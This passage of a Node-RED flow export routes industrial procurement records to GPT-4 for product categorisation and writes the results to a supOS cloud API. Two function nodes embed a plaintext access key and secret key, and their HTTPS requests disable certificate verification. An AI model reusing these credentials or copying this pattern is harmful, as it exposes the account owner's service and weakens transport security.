        "payload": "{\"到货基本计量单位\":\"个\",\"物料编码\":\"WL0708000000003100237\",\"采购行项目\":50,\"采购订单号\":4500018770,\"备注\":\"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",\"到货日期\":\"2023-03-21T00:00:00.000Z\",\"采购订单含税单价\":1120,\"物料描述\":\"电排  KCS-100A\",\"类别\":\"电工器材\"}",
        "payloadType": "json",
        "x": 570,
        "y": 2700,
        "wires": [
            [
                "5d6259b2c6b36160"
            ]
        ]
    },
    {
        "id": "5d6259b2c6b36160",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 18",
        "func": "var crypto = global.get('crypto')\nvar rp = global.get('rp');\nconst ak = \"415ed3fc72b533713244dcd553159642\"\nconst sk = \"10999785ab1c5f475c6d9c8b728e28a3\"\nconst supos = \"https://apaas-r4xv.saas.supos.io\"\n//对查询参数进行排序\n\n//对查询参数进行排序\nfunction sortQuery(jsonObj) {\n    if (jsonObj == null) return '';\n    let lowerCasekeyObj = {};\n    let lowerCasekeyArr = [];\n    for (const key in jsonObj) {\n        const lowerKey = key.toLowerCase()\n        lowerCasekeyArr.push(lowerKey);\n        lowerCasekeyObj[lowerKey] = jsonObj[key];\n    }\n    let res = '';\n    lowerCasekeyArr.sort();\n    for (const i in lowerCasekeyArr) {\n        let key = lowerCasekeyArr[i];\n        res += lowerCasekeyArr[i] + \"=\" + lowerCasekeyObj[key] + \"&\";\n    }\n    return res.substring(0, res.length - 1);\n}\n//json转查询串\nfunction json2query(jsonObj) {\n    let res = '';\n    for (const key in jsonObj) {\n        res += key + \"=\" + jsonObj[key] + \"&\"\n    }\n    return res.substring(0, res.length - 1);\n}\nfunction buildSignString(uri, methodName, queryJson, headerJson) {\n    let signStr = ''\n    // HTTP Schema\n    signStr = signStr + methodName + \"\\n\"\n    // HTTP URI\n    signStr = signStr + uri + \"\\n\"\n    // HTTP ContentType\n    signStr = signStr + headerJson['Content-Type'] + \"\\n\"\n    // CanonicalQueryString\n    signStr = signStr + sortQuery(queryJson) + \"\\n\" + \"\\n\"\n    return signStr\n}\n//使用aksk方式签名,\nfunction signHeader(uri, methodName, queryJson, headerJson) {\n    let signStr = buildSignString(uri, methodName, queryJson, headerJson);\n    console.log(\"签名源==========Start===========\")\n    console.log(signStr)\n    console.log(\"签名源==========End===========\")\n    let signature = crypto.createHmac('sha256', sk).update(signStr, 'utf8').digest('hex');\n    let final_signature = \"Sign \" + ak + \"-\" + signature\n    console.log(\"签名结果：\", final_signature)\n    headerJson['Authorization'] = final_signature;\n}\n\nfunction test() {\n    let openApiUri = \n    '/open-api/supos/oodm/v2/template/wenhao_testw/test_w/service/wenhao_testw/insert'\n    const methodName = 'POST'\n    let queryJson = null;\n    let headerJson = {\n        'Content-Type': 'application/json;charset=utf-8'\n    };\n    let wholeUrl = supos + openApiUri;\n    //注意queryJson是url上的参数，不是body部分\n    signHeader(openApiUri, methodName, queryJson, headerJson);\n    var options = {\n        method: methodName,\n        uri: wholeUrl,\n        headers: headerJson,\n        strictSSL: false,\n        body: '{\"insert\":'+JSON.stringify(msg.origin)+'}',\n        // json: true,\n        resolveWithFullResponse: true\n    };\n    if (queryJson != null) {\n        wholeUrl += \"?\" + json2query(queryJson);\n        options['uri'] = wholeUrl;\n    }\n    rp(options)\n        .then(function (response) {\n            //console.log('response:', response);\n            //msg.payload = 123;\n            msg.payload = response\n            node.send(msg);\n        })\n        .catch(function (err) {\n            console.error('错误是1111', err)\n            msg.result = err\n            node.send(msg)\n        });\n}\n\ntest()",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 810,
        "y": 2700,
        "wires": [
            [
                "f55ad3887c8b19d8"
            ]
        ]
    },
    {
        "id": "f55ad3887c8b19d8",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 29",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 1040,
        "y": 2700,
        "wires": []
    },
    {
        "id": "872330c651907f04",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 450,
        "y": 2620,
        "wires": [
            [
                "3194c0bd171bee0f"
            ]
        ]
    },
    {
        "id": "17793953e409224d",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 8",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content: '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式遵循\"物料名称:,一级类目：“，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value\n            }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 1300,
        "y": 2460,
        "wires": [
            [
                "872330c651907f04"
            ]
        ]
    },
    {
        "id": "713ef29967ee81bb",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "[{     \"到货日期\": \"2023-07-24T00:00:00.000Z\",     \"采购订单号\": 4500022829,     \"采购行项目\": 30,     \"物料编码\": \"WL1002001000003120001\",     \"物料描述\": \"2205不锈钢管 Φ57×3.5\",     \"备注\": \"3、4#浆液管回流管处更换\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49.5   },   {     \"到货日期\": \"2022-11-29T00:00:00.000Z\",     \"采购订单号\": 4500016063,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100054\",     \"物料描述\": \"2205不锈钢管 φ76×4\",     \"备注\": \"3、4#进口烟道事故喷淋\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49   }]",
        "payloadType": "json",
        "x": 680,
        "y": 2400,
        "wires": [
            [
                "7730dc50e8c30e01"
            ]
        ]
    },
    {
        "id": "15ca12ccf345b4a5",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 1150,
        "y": 2460,
        "wires": [
            [
                "17793953e409224d"
            ]
        ]
    },
    {
        "id": "66e1c7b638ac4334",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 19",
        "func": "var temp =flow.get('origin')\nmsg.origin = temp\n\nmsg.origin = temp[msg.loop.index]\nflow.set(\"temp\",msg.origin)\n\nreturn msg",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1010,
        "y": 2380,
        "wires": [
            []
        ]
    },
    {
        "id": "3f8bbc1f2e9cfb01",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 20",
        "func": "\n// msg.payload=flow.get('payload')\nmsg.origin = flow.get('temp')\n\nvar jsonObj\nvar temp\ntry {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n\n\nvar jsonObjTemp = JSON.parse(msg.temp);\n\nif (jsonObjTemp[\"类别\"] != null) {\n    temp = jsonObjTemp[\"类别\"]\n} else if (jsonObjTemp.category != null) {\n    temp = jsonObjTemp.category\n} else if (jsonObjTemp[\"一级类目\"] != null) {\n    temp = jsonObjTemp[\"一级类目\"]\n} else if (jsonObjTemp[\"物料类别\"] != null) {\n    temp = jsonObjTemp[\"物料类别\"]\n}\n\n\n\n} \ncatch (error) {\n}\nif (temp != undefined) {\n    msg.msg = temp\n\n}\nif (msg.origin != null && msg.origin != undefined) {\n    //  var jsonTmep = JSON.parse(msg.origin);\n    var jsonTmep = msg.origin;\n\n    jsonTmep[\"类别\"] = msg.msg\n\n    msg.origin = jsonTmep\n    // msg.temp = flow.get('loop')['enumeration'].length\nif (flow.get('loop').index != 0){\n    msg.result = flow.get('result') + ',' + JSON.stringify(msg.origin);\n    flow.set('result', msg.result)\n\n}else{\n    flow.set('result', JSON.stringify(msg.origin))\n}\n\n    // if (flow.get('loop')['index'] === flow.get('loop')['enumeration'].length-1){\n        msg.resultNew = JSON.parse('[' + flow.get('result') + ']');\n    // }\n\n    return msg;\n}\n\nreturn msg\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 870,
        "y": 2620,
        "wires": [
            [
                "8ee076f0aa5dffd0",
                "40dfab67424bb4f1",
                "fdbe41cf3c85c937",
                "cb64b93ea59789ab",
                "5d6259b2c6b36160"
            ]
        ]
    },
    {
        "id": "a3b3614cfcfe7373",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 21",
        "func": "msg.key = flow.get('origin')\nflow.set('loop',msg.loop)\n\nmsg.payload=msg.key[msg.loop.index]\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1000,
        "y": 2460,
        "wires": [
            [
                "15ca12ccf345b4a5"
            ]
        ]
    },
    {
        "id": "3194c0bd171bee0f",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 22",
        "func": "flow.set(\"payload\",msg.payload)\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 670,
        "y": 2620,
        "wires": [
            [
                "3f8bbc1f2e9cfb01"
            ]
        ]
    },
    {
        "id": "7730dc50e8c30e01",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 23",
        "func": "var temp = msg.payload\nflow.set(\"origin\", temp)\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 610,
        "y": 2460,
        "wires": [
            [
                "8ee076f0aa5dffd0"
            ]
        ]
    },
    {
        "id": "40dfab67424bb4f1",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 30",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "result",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1280,
        "y": 2620,
        "wires": []
    },
    {
        "id": "fdbe41cf3c85c937",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 31",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "resultNew",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1300,
        "y": 2580,
        "wires": []
    },
    {
        "id": "cb64b93ea59789ab",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 32",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1230,
        "y": 2680,
        "wires": []
    },
    {
        "id": "9c2cbb5b5348fdbb",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 24",
        "func": "msg.payload = JSON.parse(msg.payload);\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 330,
        "y": 2420,
        "wires": [
            [
                "e06cc973754a1788",
                "7730dc50e8c30e01"
            ]
        ]
    },
    {
        "id": "e06cc973754a1788",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 33",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 580,
        "y": 2340,
        "wires": []
    },
    {
        "id": "bbe620474e026a47",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 160,
        "y": 2320,
        "wires": [
            [
                "117b29cdb0379461"
            ]
        ]
    },
    {
        "id": "117b29cdb0379461",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://apaas-r4xv.saas.supos.io/api/config/download?fileName=2023-11-05%2F1699189640163%2F2221.json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 310,
        "y": 2340,
        "wires": [
            [
                "9c2cbb5b5348fdbb"
            ]
        ]
    },
    {
        "id": "b4a7d5d44dd2450b",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 690,
        "y": 3100,
        "wires": [
            [
                "557cc4b1c8e56a0c"
            ]
        ]
    },
    {
        "id": "557cc4b1c8e56a0c",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 34",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 840,
        "y": 3100,
        "wires": []
    },
    {
        "id": "60167a3b52d9cea6",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 350,
        "y": 3100,
        "wires": [
            [
                "7df79e8cb5ca0dd9"
            ]
        ]
    },
    {
        "id": "7df79e8cb5ca0dd9",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 9",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content:\n                    '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式遵循\"物料编码:,一级类目：“，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value\n            }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 520,
        "y": 3100,
        "wires": [
            [
                "b4a7d5d44dd2450b"
            ]
        ]
    },
    {
        "id": "c0ae990ec5b50104",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "[{     \"到货日期\": \"2023-07-24T00:00:00.000Z\",     \"采购订单号\": 4500022829,     \"采购行项目\": 30,     \"物料编码\": \"WL1002001000003120001\",     \"物料描述\": \"2205不锈钢管 Φ57×3.5\",     \"备注\": \"3、4#浆液管回流管处更换\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49.5   },   {     \"到货日期\": \"2022-11-29T00:00:00.000Z\",     \"采购订单号\": 4500016063,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100054\",     \"物料描述\": \"2205不锈钢管 φ76×4\",     \"备注\": \"3、4#进口烟道事故喷淋\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49   }]",
        "payloadType": "json",
        "x": 370,
        "y": 3040,
        "wires": [
            [
                "60167a3b52d9cea6"
            ]
        ]
    },
    {
        "id": "b00f05752c1b3ea4",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 25",
        "func": "var crypto = global.get('crypto')\nvar rp = global.get('rp');\nconst ak = \"415ed3fc72b533713244dcd553159642\"\nconst sk = \"10999785ab1c5f475c6d9c8b728e28a3\"\nconst supos = \"https://apaas-r4xv.saas.supos.io\"\n//对查询参数进行排序\n\n//对查询参数进行排序\nfunction sortQuery(jsonObj) {\n    if (jsonObj == null) return '';\n    let lowerCasekeyObj = {};\n    let lowerCasekeyArr = [];\n    for (const key in jsonObj) {\n        const lowerKey = key.toLowerCase()\n        lowerCasekeyArr.push(lowerKey);\n        lowerCasekeyObj[lowerKey] = jsonObj[key];\n    }\n    let res = '';\n    lowerCasekeyArr.sort();\n    for (const i in lowerCasekeyArr) {\n        let key = lowerCasekeyArr[i];\n        res += lowerCasekeyArr[i] + \"=\" + lowerCasekeyObj[key] + \"&\";\n    }\n    return res.substring(0, res.length - 1);\n}\n//json转查询串\nfunction json2query(jsonObj) {\n    let res = '';\n    for (const key in jsonObj) {\n        res += key + \"=\" + jsonObj[key] + \"&\"\n    }\n    return res.substring(0, res.length - 1);\n}\nfunction buildSignString(uri, methodName, queryJson, headerJson) {\n    let signStr = ''\n    // HTTP Schema\n    signStr = signStr + methodName + \"\\n\"\n    // HTTP URI\n    signStr = signStr + uri + \"\\n\"\n    // HTTP ContentType\n    signStr = signStr + headerJson['Content-Type'] + \"\\n\"\n    // CanonicalQueryString\n    signStr = signStr + sortQuery(queryJson) + \"\\n\" + \"\\n\"\n    return signStr\n}\n//使用aksk方式签名,\nfunction signHeader(uri, methodName, queryJson, headerJson) {\n    let signStr = buildSignString(uri, methodName, queryJson, headerJson);\n    console.log(\"签名源==========Start===========\")\n    console.log(signStr)\n    console.log(\"签名源==========End===========\")\n    let signature = crypto.createHmac('sha256', sk).update(signStr, 'utf8').digest('hex');\n    let final_signature = \"Sign \" + ak + \"-\" + signature\n    console.log(\"签名结果：\", final_signature)\n    headerJson['Authorization'] = final_signature;\n}\n\nfunction test(hello) {\n    let openApiUri = \n    '/open-api/supos/oodm/v2/template/wenhao_testw/test_w/service/wenhao_testw/insert'\n    const methodName = 'POST'\n    let queryJson = null;\n    let headerJson = {\n        'Content-Type': 'application/json;charset=utf-8'\n    };\n    let wholeUrl = supos + openApiUri;\n    //注意queryJson是url上的参数，不是body部分\n    signHeader(openApiUri, methodName, queryJson, headerJson);\n    var options = {\n        method: methodName,\n        uri: wholeUrl,\n        headers: headerJson,\n        strictSSL: false,\n        body: hello,\n        // json: true,\n        resolveWithFullResponse: true\n    };\n    if (queryJson != null) {\n        wholeUrl += \"?\" + json2query(queryJson);\n        options['uri'] = wholeUrl;\n    }\n    rp(options)\n        .then(function (response) {\n            //console.log('response:', response);\n            //msg.payload = 123;\n            // msg.payload = response\n            // node.send(msg);\n        })\n        .catch(function (err) {\n            console.error('错误是1111', err)\n            msg.result = err\n            node.send(msg)\n        });\n}\n\nfor (let index = 0; index < msg.origin.length; index++) {\n    var hello='{\"insert\":'+JSON.stringify(msg.origin[index])+'}'\ntest(hello)    \nif (index == msg.origin.length -1){\n    node.send(msg);\n}\n}\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 810,
        "y": 3640,
        "wires": [
            [
                "b2dd2166084b2f1f"
            ]
        ]
    },
    {
        "id": "b2dd2166084b2f1f",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 35",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 1040,
        "y": 3640,
        "wires": []
    },
    {
        "id": "192082606ead78ea",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 450,
        "y": 3560,
        "wires": [
            [
                "a5e8a19673785205",
                "f2bf2b3def7468a7"
            ]
        ]
    },
    {
        "id": "0f40a328e1deb91d",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 10",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content:\n                    '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式严格遵循{\"一级类目\"：{一级类目}}，其余键值对不要返回，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value                     }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 1340,
        "y": 3460,
        "wires": [
            [
                "192082606ead78ea"
            ]
        ]
    },
    {
        "id": "fdf2a1c4be4284e6",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 1190,
        "y": 3460,
        "wires": [
            [
                "0f40a328e1deb91d"
            ]
        ]
    },
    {
        "id": "64684b209232b3a9",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 27",
        "func": "\nmsg.payload=flow.get('payload')\nmsg.origin = flow.get('originO')\n\nvar jsonObj\nvar temp\ntry {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n\n\nvar jsonObjTemp = JSON.parse(msg.temp);\n    msg.jsonObjTemp = jsonObjTemp\n\nif (jsonObjTemp[\"类别\"] != null) {\n    temp = jsonObjTemp[\"类别\"]\n} else if (jsonObjTemp.category != null) {\n    temp = jsonObjTemp.category\n} else if (jsonObjTemp[\"一级类目\"] != null) {\n    temp = jsonObjTemp[\"一级类目\"]\n} else if (jsonObjTemp[\"物料类别\"] != null) {\n    temp = jsonObjTemp[\"物料类别\"]\n}\n\n\n\n} \ncatch (error) {\n}\nif (temp != undefined) {\n    msg.msg = temp\n\n}\n\n\nfor (let index = 0; index < msg.origin.length; index++) {\n   msg.test= msg.origin[index]\n msg.origin[index]['类别'] = jsonObjTemp[index]['一级类目']\n}\n\nreturn msg\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 870,
        "y": 3560,
        "wires": [
            [
                "23a38d62ce86fa03",
                "4c7a3bb6fac5d322",
                "3c7d5714cb407e4c",
                "b00f05752c1b3ea4",
                "1c18d2e8dd1ff583",
                "c95e0cef357f7a97"
            ]
        ]
    },
    {
        "id": "4fafe91522852f66",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 28",
        "func": "flow.set('loop',msg.loop.value)\nvar origin = flow.get('origin')\nvar end = msg.loop.value * 30\nvar start = end-29\n\nfor (let index = start; index <= end; index++) {\n    var originO\n\nif (msg.payload != null && msg.payload != undefined){\n    var temp ={\n        //    \"物料编码\":origin[index]['物料编码'],\n        \"物料描述\": origin[index]['物料描述']\n    }\n    msg.payload = msg.payload + ',' + JSON.stringify(temp)\n    originO = originO + ',' + JSON.stringify(origin[index])\n}else {\n    msg.payload = {\n        // \"物料编码\":origin[index]['物料编码'],\n        \"物料描述\": origin[index]['物料描述']\n    }\n    msg.payload= JSON.stringify(msg.payload);\n    originO = JSON.stringify(origin[index])\n\n}\n\n    if (index==end){\n        msg.payload='['+msg.payload +']'\n        msg.payload=JSON.parse(msg.payload);\n\n        var test = '['+originO +']'\n        msg.test =JSON.parse(test)\n        flow.set('originO',JSON.parse(test))\n        \n    }\n}\n\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1040,
        "y": 3460,
        "wires": [
            [
                "fdf2a1c4be4284e6",
                "330556b282850e79"
            ]
        ]
    },
    {
        "id": "f2bf2b3def7468a7",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 29",
        "func": "flow.set(\"payload\",msg.payload)\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
